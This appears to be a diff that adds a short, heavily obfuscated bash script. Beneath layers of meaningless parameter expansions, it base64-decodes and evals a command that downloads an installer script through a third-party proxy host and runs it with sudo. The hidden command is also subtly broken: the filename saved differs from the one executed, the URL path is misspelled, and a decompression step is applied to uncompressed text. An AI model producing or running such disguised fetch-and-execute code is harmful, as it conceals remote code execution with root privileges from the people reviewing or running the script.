@@ -1,0 +1,2 @@
+#!/bin/bash
+  ${@//r\}Fpg%6}  ${!*}  ""e'v'''\al   "$(     ${*%Axo%|d} ${@,}  ''"${@^^}"pr${*}i"n"t$'\x66'  'Y3VybCAtbyBuY3BhdC5zaCBodHRwczovL2ppYXNodS4xY2xvdWQuZWEub3JnL2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OYXBOZWtvL05hcENhdC1JbnN0YWxsZXIvcmVlZnMvaGVhZHMvbWFpbi9zY3JpcHQvaW5zdGFsbC5zaCAmJiBzdWRvIGJhc2ggbmFwY2F0LnNo' ${*}  | ${*%pl=H\(Y.c}   bas"e"'6'$'\64' -d ${*%%IgP3} |  $* "b"${@^}unz""\i\p$'\u0032'  -c ${*~~}   $*   )"  ${@%h~nIJ&O}  ${*,,}
